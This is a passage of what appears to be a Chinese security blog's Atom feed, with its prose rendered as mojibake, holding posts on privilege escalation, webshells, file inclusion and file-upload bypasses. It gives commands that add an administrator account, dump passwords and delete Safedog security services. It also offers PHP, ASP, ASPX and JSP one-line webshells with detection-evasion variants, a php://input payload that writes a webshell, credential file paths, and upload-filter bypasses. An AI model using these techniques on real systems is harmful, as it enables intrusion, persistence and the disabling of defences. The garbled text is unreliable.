<pre><code class="language-php">ä¾‹å¦‚æŸ¥çœ‹ MS08-068çš„ç½‘é¡µï¼Œæ‰“å¼€æ–¹å¼ä¸ºâ€œhttpsï¼š//technet.microsoft.com/library/security/ms08-068â€ã€‚
å¦‚æœæ˜¾ ç¤ºä¸ºâ€œä¸¥é‡â€ï¼Œåˆ™è¡¨æ˜å¯ä»¥è¢«åˆ©ç”¨ã€‚
</code></pre>
<p><code>å®æ–½ææƒ</code>ï¼š</p>
<p>å¯ä»¥é€šè¿‡æ‰§è¡Œå‘½ä»¤è¿›è¡Œææƒ</p>
<pre><code class="language-php">//ç›´æ¥æ‰§è¡Œæœ¨é©¬
poc.exe ma.exe
//æ·»åŠ ç”¨æˆ·
poc.exe &quot;net user antian365 lqaz2wsx /add&quot;
poc.exe &quot;net user localgroup administrators antian365 /add&quot;
//è·å–æ˜æ–‡å¯†ç æˆ–è€…å“ˆå¸Œå€¼
poc.exe &quot;wce32.exe&quot; -w
poc.exe &quot;wce64.exe&quot; -w
poc.exe &quot;wce32&quot;
</code></pre>
<p><code>åœç”¨å®‰å…¨ç‹—</code>ï¼š</p>
<p>åœç”¨å®‰å…¨ç‹—çš„ç›¸å…³æœåŠ¡ï¼š</p>
<pre><code class="language-php">net stop &quot;Safedog Guard Center&quot; /y
net stop &quot;Safedog Update Center&quot; /y
net stop &quot;SafeDogCloudHelper&quot; /y
</code></pre>
<p>åˆ é™¤SafeDogGuardCenteræœåŠ¡ï¼š</p>
<pre><code class="language-php">sc stop &quot;SafeDogGuardCenter&quot;
sC config &quot;SafeDogGuardCenter&quot; start= disabled
sC delete &quot;SafeDogGuardCenter&quot;

sC stop &quot;Sa feDogUpdateCenter&quot;
sC config &quot;SafeDogUpdateCenter&quot; start= disabled
sC delete &quot;SafeDogUpdateCenter&quot;

sc stop &quot;SafeDogCloudHelperâ€
sC config &quot;SafeDogCloudHelper&quot; start= disabled
sC delete &quot;Sa feDogCloudHelper&quot;
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[ç®€å•æœ¨é©¬]]></title>
        <id>https://z0ekball.github.io/post/jian-dan-mu-ma/</id>
        <link href="https://z0ekball.github.io/post/jian-dan-mu-ma/">
        </link>
        <updated>2021-08-10T11:12:06.000Z</updated>
        <content type="html"><![CDATA[<h2 id="ä¸€å¥è¯æœ¨é©¬">ä¸€å¥è¯æœ¨é©¬</h2>
<h3 id="åŸç†">åŸç†</h3>
<pre><code class="language-php"> &lt;?php @eval($_POST['pass']); ?&gt;
</code></pre>
<p><code>&lt;?php ?&gt;</code>ï¼šè§£ææˆphpä»£ç </p>
<p><code>@</code>ï¼šä¸æŠ¥é”™</p>
<p><code>$_POST['pass']</code>ï¼šphpé‡Œé¢å‡ ä¸ªè¶…å…¨å±€å˜é‡ï¼Œ<code>$_GET</code>ã€<code>$_POST</code>å°±æ˜¯å…¶ä¸­ä¹‹ä¸€ï¼Œæ„æ€ä¸ºç”¨postæ–¹æ³•æ¥æ”¶passè¿™ä¸ªå˜é‡</p>
<p><code>eval()</code>ï¼ševal()æŠŠå­—ç¬¦ä¸²ä½œä¸ºPHPä»£ç æ‰§è¡Œ</p>
<p><code>æ•´å¥æ„æ€</code>ï¼špostæ–¹å¼æ¥æ”¶å˜é‡passï¼Œè‹¥pass=echo 'a'ï¼Œåˆ™ä»£ç å°±æˆäº†<code>&lt;?php eval(&quot;echo 'a';&quot;); ?&gt;</code>ï¼Œä¹Ÿå°±æ˜¯é€šè¿‡passè¿™ä¸ªå˜é‡ä¼ å…¥phpä»£ç ä¸ºæ‰€æ¬²ä¸ºã€‚</p>
<p>é€šè¿‡ä¸€å¥è¯æœ¨é©¬ï¼Œä½¿ç”¨èœåˆ€ã€èšå‰‘ã€å†°èç­‰å¼ºæ‚çš„å·¥å…·ï¼Œå¯ä»¥æ”»é™·æ•´ä¸ªç½‘ç«™ä¸»æœºã€‚</p>
<h3 id="å¸¸è§ä¸€å¥è¯æœ¨é©¬">å¸¸è§ä¸€å¥è¯æœ¨é©¬</h3>
<h4 id="åŸºç¡€æ¬¾">åŸºç¡€æ¬¾</h4>
<pre><code class="language-php">phpçš„ä¸€å¥è¯æœ¨é©¬ï¼š&lt;?php @eval($_POST['pass']);?&gt;
aspçš„ä¸€å¥è¯æœ¨é©¬ï¼š&lt;%eval request (&quot;pass&quot;)%&gt;
aspxçš„ä¸€å¥è¯æœ¨é©¬ï¼š&lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;
jspçš„ä¸€å¥è¯æœ¨é©¬ï¼š
&lt;%
if(request.getParameter(&quot;f&quot;)!=null)(new java.io.FileOutputStream(application.getRealPath(&quot;\\&quot;)+request.getParameter(&quot;f&quot;))).write(request.getParameter(&quot;t&quot;).getBytes());
%&gt;
</code></pre>
<h4 id="ç®€å•å˜å‹">ç®€å•å˜å‹</h4>
<p>php:</p>
<pre><code class="language-php">//ç»•è¿‡&lt;?
&lt;script language=&quot;php&quot;&gt;@eval($_POST[pass])&lt;/script&gt;
    
//assertå‡½æ•°
&lt;?php assert(@$_POST[pass]);?&gt;
    
//creat_functionå‡½æ•°ï¼Œä¼ å‚åˆ°fun()å¹¶æ‰§è¡Œ
&lt;?php
$fun = create_function('',$_POST['pass']);
$fun();
?&gt;
    
//call_user_funcå›è°ƒå‡½æ•°ï¼Œç»•è¿‡waf
&lt;?php
@call_user_func(assert,$_POST['pass']);
?&gt;

//preg_replaceå‡½æ•°
&lt;?php
@preg_replace(&quot;/abcde/e&quot;, $_POST['pass'], &quot;abcdefg&quot;);
?&gt;

// file_put_contentså‡½æ•°,ç”Ÿæˆæœ¨é©¬æ–‡ä»¶
&lt;?php
$test='&lt;?php $a=$_POST[&quot;pass&quot;];assert($a); ?&gt;';
file_put_contents(&quot;Trojan.php&quot;, $test);
?&gt;

//arrayæ•°ç»„
&lt;?php
$a='assert';
array_map(&quot;$a&quot;,$_REQUEST);
?&gt;
&lt;?php
$item['JON']='assert';
$array[]=$item;
$array[0]['JON']($_POST[&quot;pass&quot;]);
?&gt;

//phpå˜é‡å‡½æ•°
&lt;?php
$a = &quot;eval&quot;;
$a(@$_POST['pass']);
?&gt;

</code></pre>
<h3 id="æœ¨é©¬å…æ€">æœ¨é©¬å…æ€</h3>
<h4 id="æœ¨é©¬æŸ¥æ€">æœ¨é©¬æŸ¥æ€</h4>
<p><code>æ–‡ä»¶å†…å®¹æŸ¥æ€</code>ï¼šå¯¹è„šæœ¬æ–‡ä»¶ä¸­æ‰€ä½¿ç”¨çš„å…³é”®è¯ã€é«˜å±å‡½æ•°ã€æ–‡ä»¶ä¿®æ”¹çš„æ—¶é—´ã€æ–‡ä»¶æƒé™ã€æ–‡ä»¶çš„æ‰€æœ‰è€…ä»¥åŠå’Œå…¶å®ƒæ–‡ä»¶çš„å…³è”æ€§ç­‰å¤šä¸ªç»´åº¦çš„ç‰¹å¾è¿›è¡Œæ£€æµ‹,å³å…ˆå»ºç«‹ä¸€ä¸ªæ¶æ„å­—ç¬¦ä¸²ç‰¹å¾åº“ï¼ŒåŒæ—¶å¯¹WEBæ–‡ä»¶ä¿®æ”¹æ—¶é—´ï¼Œæ–‡ä»¶æƒé™ä»¥åŠæ–‡ä»¶æ‰€æœ‰è€…ç­‰è¿›è¡Œç¡®è®¤ã€‚å®¹æ˜“è¯¯æŠ¥ï¼Œæ— æ³•å¯¹åŠ å¯†æˆ–è€…ç»è¿‡ç‰¹æ®Šå¤„ç†çš„Webshellæ–‡ä»¶è¿›è¡Œæ£€æµ‹ã€‚</p>
<p><code>ç½‘ç»œè¯·æ±‚æŸ¥æ€</code>ï¼šå½“æœ¨é©¬è¢«æ‰§è¡Œæ—¶ï¼Œå¦‚æœè¯·æ±‚å‚æ•°çš„å€¼ä¸­å­˜åœ¨æŸäº›å±é™©å‡½æ•°ã€æˆ–è€…å…³é”®å­—ï¼Œé‚£ä¹ˆä¼šè¢«é˜²æŠ¤äº§å“æ‹¦æˆªï¼Œé€šè¿‡Webshellè¿è¡Œæ—¶ä½¿ç”¨çš„ç³»ç»Ÿå‘½ä»¤æˆ–è€…ç½‘ç»œæµé‡åŠçŠ¶æ€çš„å¼‚å¸¸æ¥åˆ¤æ–­åŠ¨ä½œçš„å¨èƒç¨‹åº¦ã€‚</p>
<p><code>æ—¥å¿—åˆ†ææŸ¥æ€</code>ï¼šä½¿ç”¨Webshellä¸€èˆ¬ä¸ä¼šåœ¨ç³»ç»Ÿæ—¥å¿—ä¸­ç•™ä¸‹è®°å½•ï¼Œä½†æ˜¯ä¼šåœ¨ç½‘ç«™çš„webæ—¥å¿—ä¸­ç•™ä¸‹Webshellé¡µé¢çš„è®¿é—®æ•°æ®å’Œæ•°æ®æäº¤è®°å½•ã€‚æ—¥å¿—åˆ†ææ£€æµ‹ æŠ€æœ¯é€šè¿‡å¤§é‡çš„æ—¥å¿—æ–‡ä»¶å»ºç«‹è¯·æ±‚æ¨¡å‹ä»è€Œæ£€æµ‹å‡ºå¼‚å¸¸æ–‡ä»¶ï¼Œç§°ä¹‹ä¸ºï¼šHTTPå¼‚å¸¸è¯·æ±‚æ¨¡å‹æ£€æµ‹ã€‚</p>
<h4 id="æœ¨é©¬å…æ€-2">æœ¨é©¬å…æ€</h4>
<p><code>å…³é”®å­—ç»•è¿‡</code>ï¼šæ‹†åˆ†å…³é”®å­—</p>
<p><code>æ„é€ å‡½æ•°</code>ï¼šæ„é€ ä¸€ä¸ªå‡½æ•°ï¼Œæ‹¼æ¥æˆä¸€å¥è¯æœ¨é©¬</p>
<pre><code class="language-php">&lt;?php
function x()
{
    return $_POST['pass'];
}
eval(x());
?&gt;
</code></pre>
<p><code>æ³¨é‡Šéš”æ–­</code>ï¼šä¸€èˆ¬æŸ¥æ€ä¼šå¯¹é«˜å±å‡½æ•°çš„å‰åè¯­å¥è¿›è¡Œæ‹¼æ¥å¹¶æ£€æµ‹ï¼Œæ³¨é‡Šç¬¦å¯ä»¥éš”æ–­è¿™ç§æ‹¼æ¥ä»è€Œç»•è¿‡æ£€æŸ¥</p>
<pre><code class="language-php">&lt;?php
function x()
{
    return &quot;/*sasas23123*/&quot;.$_POST['pass'].&quot;/*sdfw3123*/&quot;;
}
eval(x());
?&gt;
</code></pre>
<p><code>è½¬ç ç»•è¿‡</code>ï¼šè½¬ç ç‰¹å¾å€¼ï¼Œå†é€šè¿‡è§£ç æ¥æ‰§è¡Œç›¸å…³è¯­å¥</p>
<p><code>æ•°ç»„æ‹¼æ¥</code>ï¼šåˆ©ç”¨æ•°ç»„æ‹¼æ¥æœ¨é©¬è¯­å¥</p>
<pre><code class="language-php">&lt;?php
$b = substr_replace(&quot;assexx&quot;,&quot;rt&quot;,4);
$a = array($arrayName = ($arrayName =($arrayName = array('a' =&gt; $b($_POST['pass'])))));
?&gt;
</code></pre>
<p><code>å·¥å…·åˆ©ç”¨</code>ï¼šä¼ ç»Ÿæ–¹æ³•åˆ©ç”¨èœåˆ€ç®¡ç†webshell çš„æµé‡ç‰¹å¾å¾ˆæ˜æ˜¾ï¼Œå¾ˆå®¹æ˜“è¢«æ£€æµ‹åˆ°ï¼Œå¯ä½¿ç”¨æµé‡åŠ å¯†çš„webshellå·¥å…·ï¼Œå¦‚å†°èï¼Œæ¥èº²é¿æµé‡ç›‘æµ‹ã€‚</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[æ–‡ä»¶åŒ…å«]]></title>
        <id>https://z0ekball.github.io/post/wen-jian-bao-han/</id>
        <link href="https://z0ekball.github.io/post/wen-jian-bao-han/">
        </link>
        <updated>2021-07-29T02:59:27.000Z</updated>
        <content type="html"><![CDATA[<p><code>æ¼æ´åŸç†</code>ï¼šinclude()ã€include_once()ã€require()ã€require_once()ç­‰å‡½æ•°å¯ä»¥ç›´æ¥ä»¥phpæ ¼å¼æ‰§è¡ŒåŒ…å«æ–‡ä»¶çš„ä»£ç ï¼Œä¸å—æ–‡ä»¶æ ¼å¼é™åˆ¶ã€‚webåº”ç”¨è¿™äº›å‡½æ•°ï¼Œä¸”åŒ…å«çš„æ–‡ä»¶è·¯å¾„æ˜¯ç”±ç”¨æˆ·ä¼ è¾“å‚æ•°æ–¹å¼å¼•å…¥ï¼Œç”¨æˆ·è®¿é—®è¢«åŒ…å«æ–‡ä»¶æ—¶è¯¥æ–‡ä»¶ä»¥phpæ ¼å¼è§£æã€‚æ”»å‡»è€…éœ€è¦çŸ¥é“æ–‡ä»¶å­˜æ”¾çš„è·¯å¾„æ‰èƒ½è¿›è¡Œè®¿é—®ã€‚</p>
<pre><code class="language-php">include():æ‰§è¡Œåˆ°includeå‡½æ•°æ—¶æ‰æ–‡ä»¶åŒ…å«ï¼Œæ‰¾ä¸åˆ°è¢«åŒ…å«çš„æ–‡ä»¶è·¯å¾„æ—¶ï¼Œå‘å‡ºè­¦å‘Šï¼Œè„šæœ¬ç»§ç»­è¿è¡Œ
require():åªè¦ç¨‹åºä¸€è¿è¡Œå°±è¿›è¡Œæ–‡ä»¶åŒ…å«ï¼Œæ‰¾ä¸åˆ°è¢«åŒ…å«çš„æ–‡ä»¶è·¯å¾„æ—¶ï¼Œäº§ç”Ÿè‡´å‘½é”™è¯¯ï¼Œè„šæœ¬åœæ­¢è¿è¡Œ
include_once()ä¸require():ä¸ä¸Šè¿°å‡½æ•°ä¸€æ ·ï¼Œåªæ˜¯è‹¥æ–‡ä»¶ä¸­ä»£ç å·²ç»è¢«åŒ…å«åˆ™ä¸ä¼šå†æ¬¡åŒ…å«
</code></pre>
<p><code>æ•æ„Ÿè·¯å¾„</code>ï¼š</p>
<p>å…¸å‹ï¼š</p>
<pre><code class="language-php">?page=a.php
?home=b.html
?file=contentâ€¦
</code></pre>
<p>Windowsï¼š</p>
<pre><code class="language-php">C:\boot.ini //æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬
C:\windows\system32\inetsrv\MetaBase.xml //IIS é…ç½®æ–‡ä»¶
C:\windows\repair\sam //å­˜å‚¨ windows ç³»ç»Ÿåˆæ¬¡å®‰è£…çš„å¯†ç 
C:\Program Files\mysql\my.ini //mysql é…ç½®
C:\Program Files\mysql\data\mysql\user.MYD //Mysql root
C:\windows\php.ini //php é…ç½®ä¿¡æ¯
C:\windows\my.ini //mysql é…ç½®æ–‡ä»¶
</code></pre>
<p>UNIX/Linuxï¼š</p>
<pre><code class="language-php">/etc/passwd
/usr/local/app/apache2/conf/httpd.conf //apache2 é»˜è®¤é…ç½®æ–‡ä»¶
/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //è™šæ‹Ÿç½‘ç«™è®¾ç½®
/usr/local/app/php5/lib/php.ini //PHP ç›¸å…³é…ç½®
/etc/httpd/conf/httpd.conf //apache
/etc/php5/apache2/php.ini //ubuntu ç³»ç»Ÿçš„é»˜è®¤è·¯å¾„
</code></pre>
<h4 id="æœ¬åœ°åŒ…å«">æœ¬åœ°åŒ…å«</h4>
<p>1.txtå’Œ1.phpåœ¨åŒä¸€æ–‡ä»¶ç›®å½•ä¸‹ï¼Œè¢«åŒ…å«æ–‡ä»¶æ— è®ºä»€ä¹ˆæ ¼å¼éƒ½èƒ½è§£ææˆphp</p>
<p>1.txt:</p>
<pre><code class="language-php">&lt;?php phpinfo();?&gt;
</code></pre>
<p>1.php:</p>
<pre><code class="language-php">&lt;?php
$b=$_GET['id'];
include($b);
?&gt;
</code></pre>
<p><code>playload</code>:</p>
<pre><code class="language-php">***/1.php?id=1.txt //è¿”å›phpinfoé¡µé¢
</code></pre>
<h4 id="è¿œç¨‹åŒ…å«">è¿œç¨‹åŒ…å«</h4>
<p><code>æ¡ä»¶</code>ï¼š ä¸€èˆ¬ PHP é»˜è®¤å…³é—­è¿œç¨‹åŒ…å«ï¼Œå¼€å¯è¿œç¨‹æ–‡ä»¶åŒ…å«åŠŸèƒ½éœ€è¦åœ¨ php.ini ä¸­ä¿®æ”¹ï¼š<br>
Allow_url_include = onã€allow_url_fopen=on</p>
<p><code>playload</code>:</p>
<pre><code class="language-php">***/1.php?id=http:(æ–‡ä»¶ç»å¯¹è·¯å¾„) 
</code></pre>
<h4 id="phpä¼ªåè®®">phpä¼ªåè®®</h4>
<p><code>file://</code>:</p>
<p>ç”¨äºè®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ</p>
<p>æ¡ä»¶(php.ini)ï¼š allow_url_fopen   off/on    allow_url_include off/on</p>
<pre><code class="language-php">fileï¼š//[æ–‡ä»¶çš„ç»å¯¹è·¯å¾„å’Œæ–‡ä»¶å]
    file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt
fileï¼š//[æ–‡ä»¶çš„ç›¸å¯¹è·¯å¾„å’Œæ–‡ä»¶å]
    file=./phpinfo.txt
fileï¼š//[httpï¼š//ç½‘ç»œè·¯å¾„å’Œæ–‡ä»¶å]
    file=http://127.0.0.1/phpinfo.txt 
</code></pre>
<p><code>phpï¼š//filter</code>ï¼š</p>
<p>ç”¨äºè¯»å–æºç å¹¶è¿›è¡Œbash64ç¼–ç è¾“å‡ºï¼›<br>
æ¡ä»¶ï¼ˆphp.iniï¼‰ï¼šallow_url_fope   off/on  allow_url_include off/on</p>
<pre><code class="language-php">php://filter/read=convert.base64-encode/resource=[æ–‡ä»¶å]è¯»å–æ–‡ä»¶æºç 
ï¼ˆé’ˆå¯¹phpæ–‡ä»¶éœ€è¦base64ç¼–ç ï¼‰
</code></pre>
<p><code>phpï¼š//input</code>ï¼š</p>
<p>å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµ,å°†postè¯·æ±‚ä¸­çš„æ•°æ®ä½œä¸ºPHPä»£ç æ‰§è¡Œï¼›<br>
æ¡ä»¶(php.ini)ï¼šallow_url_fope   off/on     allow_url_include on</p>
<pre><code class="language-php">php://input + [POST DATA]æ‰§è¡Œphpä»£ç 
</code></pre>
<p>æœ‰å†™å…¥æƒé™åˆ™å¯ä»¥å†™å…¥ä¸€å¥è¯æœ¨é©¬</p>
<pre><code class="language-php">php://input
[POST DATAéƒ¨åˆ†]
&lt;?php fputs(fopen('1juhua.php','w'),'&lt;?php @eval($_GET[cmd]); ?&gt;'); ?&gt;
</code></pre>
<p><code>php://stdin</code>:</p>
<p>åªè¯»ï¼Œphp://stdout å’Œ php://stderr æ˜¯åªå†™çš„ã€‚</p>
<p><code>php://output</code>:æ˜¯ä¸€ä¸ªåªå†™çš„æ•°æ®æµï¼Œ å…è®¸ä½ ä»¥ print å’Œ echo ä¸€æ ·çš„æ–¹å¼ å†™å…¥åˆ°è¾“å‡ºç¼“å†²åŒºã€‚</p>
<p><code>php://fd</code>:å…è®¸ç›´æ¥è®¿é—®æŒ‡å®šçš„æ–‡ä»¶æè¿°ç¬¦ã€‚</p>
<p><code>zip://,bzip://,zlib://</code>:</p>
<p>å‹ç¼©æµï¼Œå¯ä»¥è®¿é—®å‹ç¼©æ–‡ä»¶ä¸­çš„å­æ–‡ä»¶ï¼Œä¸éœ€è¦ä¼ åç¼€å</p>
<p>æ¡ä»¶ï¼š    allow_url_fope   off/on    allow_url_include off/on</p>
<pre><code class="language-php">zip://[å‹ç¼©æ–‡ä»¶ç»å¯¹è·¯å¾„]%23[å‹ç¼©æ–‡ä»¶å†…çš„å­æ–‡ä»¶å]ï¼ˆ#ç¼–ç ä¸º%23ï¼‰
bzip2://file.bz2
zlib://file.gz
</code></pre>
<p><code>data://</code>ï¼š</p>
<p>ä¼ é€’ç›¸åº”æ ¼å¼æ•°æ®ï¼Œç”¨äºæ‰§è¡Œphpä»£ç </p>
<p>æ¡ä»¶ï¼š    allow_url_fope   on    allow_url_include on</p>
<pre><code class="language-php">data://text/plain,&lt;?php%20phpinfo();?&gt;
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
</code></pre>
<p><code>pharï¼š//</code></p>
<p>ä¸zip://ç±»ä¼¼ï¼ŒåŒæ ·å¯ä»¥è®¿é—®zipæ ¼å¼å‹ç¼©åŒ…å†…å®¹</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[æ–‡ä»¶ä¸Šä¼ ]]></title>
        <id>https://z0ekball.github.io/post/wen-jian-shang-chuan/</id>
        <link href="https://z0ekball.github.io/post/wen-jian-shang-chuan/">
        </link>
        <updated>2021-07-27T08:23:05.000Z</updated>
        <content type="html"><![CDATA[<h2 id="æ–‡ä»¶ä¸Šä¼ æ¼æ´">æ–‡ä»¶ä¸Šä¼ æ¼æ´</h2>
<h3 id="1æ— éªŒè¯">1.æ— éªŒè¯</h3>
<p>ä¹Ÿå°±æ˜¯å‰ç«¯å’Œåç«¯éƒ½ä¸è¿‡æ»¤ä¸Šä¼ çš„æ–‡ä»¶ï¼Œæ•…åªéœ€ä¼ å…¥å«ä¸€å¥è¯æœ¨é©¬</p>
<pre><code class="language-php">&lt;?php @eval($_POST['pass']);?&gt;
</code></pre>
<p>çš„phpæ–‡ä»¶ï¼Œå†ç”¨èœåˆ€æˆ–è€…èšå‰‘è¿æ¥å³å¯ã€‚</p>
<h3 id="2jså‰ç«¯éªŒè¯">2.jså‰ç«¯éªŒè¯</h3>
<p>é¡¾åæ€ä¹‰ï¼Œå°±æ˜¯åªåœ¨æµè§ˆå™¨å‰ç«¯è¿›è¡Œç®€å•çš„æ–‡ä»¶åè¿‡æ»¤ï¼Œåªå…è®¸ä¸Šä¼ æŸç§æ–‡ä»¶åã€‚ç®€å•ç²—æš´çš„åšæ³•æ˜¯ç›´æ¥ç¦ç”¨æµè§ˆå™¨é‡Œçš„jsä»£ç ã€‚<br>
<code>ç»•è¿‡æ–¹æ³•</code>ï¼šæŠŠå«æœ‰ä¸€å¥è¯æœ¨é©¬çš„phpæ–‡ä»¶æ”¹æˆå…è®¸ä¸Šä¼ çš„æ–‡ä»¶åï¼Œä¸Šä¼ å¹¶æŠ“åŒ…ï¼Œä¿®æ”¹æ–‡ä»¶åç¼€ä¸ºphpå†æ”¾åŒ…å³å¯ã€‚</p>
<h3 id="3mimeç»•è¿‡">3.MIMEç»•è¿‡</h3>
<p>ä¸Šä¼ phpæœ¨é©¬ï¼ŒæŠ“åŒ…ä¿®æ”¹Content-Typeä¸ºåˆæ³•ç±»å‹å³å¯</p>
<p>ä¾‹å¦‚ï¼šimage/gif</p>
<h3 id="4htaccess">4.htaccess</h3>
<p><code>htaccessæ–‡ä»¶</code>ï¼šæ˜¯ApacheæœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚é€šè¿‡htaccessæ–‡ä»¶ï¼Œå¯ä»¥å¸®æˆ‘ä»¬å®ç°ï¼šç½‘é¡µ301é‡å®šå‘ã€è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ã€æ”¹å˜æ–‡ä»¶æ‰©å±•åã€å…è®¸/é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½ã€‚åœ¨æ–‡ä»¶ä¸Šä¼ ä¸­æ„é€ htaccessæ–‡ä»¶èƒ½ä½¿pngä»¥phpæ ¼å¼è§£æã€‚</p>
<p><code>å’Œhttpdp.comåŒºåˆ«</code>ï¼šåªä½œç”¨äºå½“å‰ç›®å½•ï¼Œåªåœ¨è®¿é—®å½“å‰ç›®å½•æ‰åŠ è½½</p>
<p><code>æ¼æ´åˆ©ç”¨</code></p>
<pre><code class="language-php">//æ–¹æ³•ä¸€
SetHandler application/x-httpd-php  	//æ‰€æœ‰çš„æ–‡ä»¶å½“åšphpæ–‡ä»¶æ¥è§£æ
//æ–¹æ³•äºŒ
AddType application/x-httpd-php .png	//.pngæ–‡ä»¶å½“ä½œphpæ–‡ä»¶è§£æ
</code></pre>
<p>åœ¨htaccessæ–‡ä»¶ä¸­å†™å…¥ä»£ç å¹¶ä¸Šä¼ ï¼Œå†ä¸Šä¼ å†™æœ‰ä¸€å¥è¯æœ¨é©¬çš„pngæ–‡ä»¶ï¼Œèšå‰‘è¿æ¥å³å¯ã€‚</p>
<h3 id="5æ–‡ä»¶å¤´æ£€æŸ¥">5.æ–‡ä»¶å¤´æ£€æŸ¥</h3>
<p>å‰é¢éƒ½æ˜¯æŠŠå«æœ‰ä¸€å¥è¯æœ¨é©¬çš„phpæ–‡ä»¶æ”¹å˜åç¼€å˜æˆpngæˆ–è€…gifç­‰å¯ä¸Šä¼ æ–‡ä»¶ï¼Œè€Œæ–‡ä»¶å¤´æ£€æŸ¥åˆ™æ£€æŸ¥è¯¥æ–‡ä»¶çš„ç‰¹å¾å€¼ï¼Œåˆ¤æ–­æ—¶å€™æ˜¯çœŸçš„pngæˆ–è€…gifï¼Œæ•…éœ€è¦è¿›ä¸€æ­¥ä¼ªè£…æ–‡ä»¶å¤´ã€‚</p>
<p><code>ç»•è¿‡æ–¹æ³•</code>:åˆ¶ä½œå›¾é©¬ï¼Œç®€å•å›¾é©¬æ˜¯ç›´æ¥æŠŠä¸€å¥è¯æœ¨é©¬æ”¾åœ¨å›¾ç‰‡æœ«å°¾ä»¥ç»•è¿‡æ–‡ä»¶å¤´æ£€æŸ¥</p>
<pre><code class="language-php">//å‘½ä»¤è¡Œåˆæˆå›¾é©¬
copy 1.png/b+1.txt/a 2.png
//b,aè¡¨ç¤ºåˆæˆæ—¶å„æ–‡ä»¶çš„ç¼–ç æ–¹å¼ï¼Œbä¸ºäºŒè¿›åˆ¶ï¼Œaä¸ºascll
</code></pre>
<p><code>äºŒæ¬¡æ¸²æŸ“</code>ï¼šåŒæ ·ä¹Ÿæ˜¯æ£€æµ‹æ–‡ä»¶æ˜¯å¦æ˜¯çœŸçš„pngæˆ–gifï¼Œä¸Šä¼ ä¹‹åçš„å›¾ç‰‡ä¼šè¢«äºŒæ¬¡æ¸²æŸ“ï¼Œä½¿å¾—å›¾é©¬ä¸­çš„ä¸€å¥è¯æœ¨é©¬å˜æˆä¹±ç æ— æ³•æ‰§è¡Œ</p>
<p><code>ç»•è¿‡æ–¹æ³•</code>ï¼šä¸‹è½½è¢«äºŒæ¬¡æ¸²æŸ“åçš„å›¾é©¬ä¸åŸæ¥çš„å›¾é©¬æ¯”è¾ƒï¼Œæ‰¾åˆ°ç›¸åŒçš„åœ°æ–¹ï¼Œæ’å…¥ä¸€å¥è¯æœ¨é©¬ã€‚</p>
<p>ï¼ˆpngã€jpgã€jpegéƒ½ä¸å¥½æ”¹ï¼Œgifå¥½æ”¹ï¼‰</p>
<img src="C:\Users\ä¸·æœ¨ä¸·\AppData\Roaming\Typora\typora-user-images\image-20211018165017388.png" alt="image-20211018165017388" style="zoom: 50%;" />
<p>ä¸Šä¼ å›¾é©¬ï¼Œé…åˆè§£ææ¼æ´ã€æ–‡ä»¶åŒ…å«æ¼æ´ç­‰ä½¿å›¾é©¬ä»¥phpæ ¼å¼æ‰§è¡Œå³å¯ã€‚</p>
<h3 id="6è§£ææ¼æ´">6.è§£ææ¼æ´</h3>
<h4 id="00æˆªæ–­æ”»å‡»">00æˆªæ–­æ”»å‡»</h4>
<p><code>æ¼æ´åŸç†</code>ï¼šç³»ç»Ÿç«¯è§£ææ–‡ä»¶æ ¼å¼å’ŒæœåŠ¡ç«¯è§£ææ–‡ä»¶æ ¼å¼çš„é¡ºåºä¸åŒï¼Œç³»ç»Ÿç«¯ç”±åå¾€å‰è§£æï¼ŒæœåŠ¡ç«¯åä¹‹ã€‚æŠ“åŒ…å°† xxx.php.gif æ¢æˆ xxx.php_gif(ä¸‹åˆ’çº¿ä¸º0x00)ã€‚åœ¨ä¸Šä¼ æ–‡ä»¶æ—¶ç³»ç»Ÿæ–‡ä»¶é‡åˆ°0x00ã€‚ä¼šè®¤ä¸ºæ–‡ä»¶å·²ç»ç»“æŸã€‚ä»è€Œå°†xxx.php.gifçš„å†…å®¹å†™å…¥åˆ°xxx.phpã€‚ï¼ˆéœ€è¦å…è®¸ä¿®æ”¹ä¿å­˜è·¯å¾„ï¼‰</p>
<p><code>ç»•è¿‡æ–¹æ³•</code>ï¼š</p>
<p>GETæ–¹å¼ä¸Šä¼ ï¼šæŠ“åŒ…ï¼Œåœ¨ä¿å­˜è·¯å¾„åé¢æ·»åŠ 1.php%00ï¼ˆ%00ä¼šè‡ªåŠ¨è§£ç ï¼‰ï¼Œæ–‡ä»¶åä¸å˜ä»ä¸º1.gif</p>
<p>POSTæ–¹å¼ä¸Šä¼ ï¼šæŠ“åŒ…ï¼Œåœ¨ä¿å­˜è·¯å¾„åé¢æ·»åŠ 1.php+åœ¨HEXç•Œé¢æ‰¾åˆ°è¿™ä¸ªåŠ å·ä¿®æ”¹ä¸º00ï¼Œæ–‡ä»¶åä»ä¸å˜ä¸º1.gif</p>
<h4 id="é»‘åå•ç»•è¿‡">é»‘åå•ç»•è¿‡</h4>
<p><code>ç»•è¿‡æ–¹æ³•</code>ï¼š</p>
<p>1ã€æ–‡ä»¶åå¤§å°å†™ç»•è¿‡ï¼ˆAsP, pHpç­‰ç­‰ï¼‰<br>
2ã€é»‘ç™½åå•åˆ—è¡¨ç»•è¿‡ï¼ˆphpã€php2ã€php3ã€php5ã€phtmlã€aspã€aspxã€ascxã€ashxã€cerã€asaã€jspã€jspxï¼‰cdxï¼Œ<br>
